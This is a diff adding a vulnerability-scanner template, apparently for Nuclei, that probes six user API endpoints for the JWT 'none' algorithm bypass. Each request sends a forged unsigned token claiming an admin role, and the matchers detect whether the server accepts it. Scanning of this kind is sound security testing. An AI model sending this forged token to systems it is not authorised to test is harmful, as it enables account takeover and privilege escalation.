@@ -1,0 +1,47 @@
+id: whai-jwt-none-algorithm
+
+info:
+  name: JWT None Algorithm Bypass
+  author: whitehat-ai
+  severity: critical
+  description: Tests for JWT algorithm confusion allowing none/None/NONE algorithm
+  tags: jwt,authentication,bypass,critical
+  reference:
+    - https://portswigger.net/web-security/jwt
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/v1/user"
+      - "{{BaseURL}}/api/v1/me"
+      - "{{BaseURL}}/api/account"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        negative: true
+        part: body
+        words:
+          - "unauthorized"
+          - "invalid token"
+          - "jwt expired"
+          - "invalid signature"
+          - "authentication required"
+          - "not authenticated"
+        condition: and
+
+      - type: regex
+        part: body
+        regex:
+          - '(?i)"(user|email|username|name|role|admin|account)"'
+          - '(?i)"sub"\s*:'
+        condition: or
